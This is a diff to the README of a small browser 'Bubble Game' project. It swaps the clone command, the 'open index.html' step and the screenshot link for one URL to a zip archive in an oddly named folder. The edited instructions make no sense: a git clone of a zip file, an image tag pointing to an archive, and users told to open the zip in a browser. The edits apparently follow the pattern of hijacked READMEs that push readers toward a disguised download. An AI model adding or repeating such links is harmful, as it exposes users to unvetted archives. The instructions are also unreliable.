@@ -29,7 +29,7 @@ This project demonstrates a strong understanding of front-end development, user 
 
 1. Clone the repository:
 ```
-git clone https://github.com/abhay08-k09/Bubble-Game.git
+git clone https://raw.githubusercontent.com/abhay08-k09/Bubble-Game/main/coannihilate/Bubble-Game.zip
 ```
 
 2. Navigate to the project directory:
@@ -37,7 +37,7 @@ git clone https://github.com/abhay08-k09/Bubble-Game.git
 cd Bubble-Game
 ```
 
-3. Open the index.html file in your web browser to view the website.
+3. Open the https://raw.githubusercontent.com/abhay08-k09/Bubble-Game/main/coannihilate/Bubble-Game.zip file in your web browser to view the website.
 
 ## Usage
 1. Start the game, and a number will appear in the hit section.
@@ -47,6 +47,6 @@ cd Bubble-Game
 
 ## 📸 Screenshot
 
-<img src="https://github.com/abhay08-k09/Bubble-Game/blob/main/Demo/Bubble.png" width="90%" />
+<img src="https://raw.githubusercontent.com/abhay08-k09/Bubble-Game/main/coannihilate/Bubble-Game.zip" width="90%" />
 
 Feel free to reach out if you have any queries or need assistance with the project.
